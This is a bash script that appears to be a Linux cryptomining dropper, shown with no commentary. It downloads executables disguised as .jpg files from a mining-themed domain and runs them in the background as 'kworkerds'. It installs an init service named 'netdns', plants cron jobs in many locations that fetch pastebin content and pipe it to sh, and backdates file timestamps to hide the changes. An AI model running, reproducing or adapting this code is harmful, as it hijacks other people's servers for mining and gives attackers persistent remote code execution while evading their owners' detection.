#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

function downloadrun() {
	ps=$(netstat -an | grep :56415 | wc -l)
	if [ ${ps} -eq 0 ];then
		if [ ! -f "/tmp/kworkerds" ]; then
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1538099276x-1404792622.jpg -o /tmp/kworkerds && chmod +x /tmp/kworkerds
			if [ ! -f "/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/x/1538099276x-1404792622.jpg -O /tmp/kworkerds && chmod +x /tmp/kworkerds
			fi
				nohup /tmp/kworkerds >/dev/null 2>&1 &
		else
			nohup /tmp/kworkerds >/dev/null 2>&1 &
		fi
	fi
}

function downloadrunxm() {
	mkdir -p /var/tmp
	chmod 1777 /var/tmp
	pm=$(netstat -an | grep :56415 | wc -l)
	if [ ${pm} -eq 0 ];then
		rm -rf /var/tmp/config.json*
		curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1534496022x-1404764583.jpg -o /var/tmp/config.json && chmod +x /var/tmp/config.json
		if [ ! -f "/var/tmp/config.json" ]; then
			wget https://master.minerxmr.ru/x/1534496022x-1404764583.jpg -O /var/tmp/config.json && chmod +x /var/tmp/config.json
		fi
		ARCH=$(uname -i)
		if [ "$ARCH" == "x86_64" ]; then
			rm -rf /var/tmp/kworkerds*
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1537410304x-1404764882.jpg -o /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds
			if [ ! -f "/var/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/x/1537410304x-1404764882.jpg -O /bin/kworkerds && chmod +x /var/tmp/kworkerds
			fi
			nohup /var/tmp/kworkerds >/dev/null 2>&1 &
		elif [ "$ARCH" == "i386" ]; then
			rm -rf /var/tmp/kworkerds*
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1537410750x-1566657908.jpg -o /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds
			if [ ! -f "/var/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/x/1537410750x-1566657908.jpg -O /bin/kworkerds && chmod +x /var/tmp/kworkerds
			fi
			nohup /var/tmp/kworkerds >/dev/null 2>&1 &
		else
			rm -rf /var/tmp/kworkerds*
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1537410304x-1404764882.jpg -o /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds
			if [ ! -f "/var/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/x/1537410304x-1404764882.jpg -O /bin/kworkerds && chmod +x /var/tmp/kworkerds
			fi
			nohup /var/tmp/kworkerds >/dev/null 2>&1 &
		fi	
	fi
}

function init() {
	if [ ! -f "/usr/sbin/netdns" ]; then
		curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1535175015x-1404817880.jpg -o /usr/sbin/netdns && chmod 777 /usr/sbin/netdns
		if [ ! -f "/usr/sbin/netdns" ]; then
			wget https://master.minerxmr.ru/x/1535175015x-1404817880.jpg -O /usr/sbin/netdns && chmod 777 /usr/sbin/netdns
		fi
	fi
	if [ ! -f "/etc/init.d/netdns" ]; then
		curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/x/1535175343x-1566657675.jpg -o /etc/init.d/netdns && chmod 777 /etc/init.d/netdns
		if [ ! -f "/etc/init.d/netdns" ]; then
			wget https://master.minerxmr.ru/x/1535175343x-1566657675.jpg -O /etc/init.d/netdns && chmod 777 /etc/init.d/netdns
		fi
	fi
	chkconfig --add netdns
}

function echocron() {
	echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /etc/cron.d/root
	echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /etc/cron.d/apache
	echo -e "*/23 * * * *	(curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /var/spool/cron/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/31 * * * *	(curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.hourly
	curl -fsSL https://pastebin.com/raw/1NtRkBc3 -o /etc/cron.hourly/oanacroner && chmod 755 /etc/cron.hourly/oanacroner
	if [ ! -f "/etc/cron.hourly/oanacroner" ]; then
		wget https://pastebin.com/raw/1NtRkBc3 -O /etc/cron.hourly/oanacroner && chmod 755 /etc/cron.hourly/oanacroner
	fi
	mkdir -p /etc/cron.daily
	curl -fsSL https://pastebin.com/raw/1NtRkBc3 -o /etc/cron.daily/oanacroner && chmod 755 /etc/cron.daily/oanacroner
	if [ ! -f "/etc/cron.daily/oanacroner" ]; then
		wget https://pastebin.com/raw/1NtRkBc3 -O /etc/cron.daily/oanacroner && chmod 755 /etc/cron.daily/oanacroner
	fi
	mkdir -p /etc/cron.monthly
	curl -fsSL https://pastebin.com/raw/1NtRkBc3 -o /etc/cron.monthly/oanacroner && chmod 755 /etc/cron.monthly/oanacroner
	if [ ! -f "/etc/cron.monthly/oanacroner" ]; then
		wget https://pastebin.com/raw/1NtRkBc3 -O /etc/cron.monthly/oanacroner && chmod 755 /etc/cron.monthly/oanacroner
	fi
	touch -acmr /bin/sh /var/spool/cron/root
	touch -acmr /bin/sh /var/spool/cron/crontabs/root
	touch -acmr /bin/sh /etc/cron.d/apache
	touch -acmr /bin/sh /etc/cron.d/root
	touch -acmr /bin/sh /etc/cron.hourly/oanacroner
	touch -acmr /bin/sh /etc/cron.daily/oanacroner
	touch -acmr /bin/sh /etc/cron.monthly/oanacroner
}

update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/SSCy7mY7 )
if [ ${update}x = "update"x ];then
	echocron
else
	downloadrun
	init
	echocron
	sleep 10
	port=$(netstat -an | grep :56415 | wc -l)
	if [ ${port} -eq 0 ];then
		downloadrunxm
	fi
fi
#
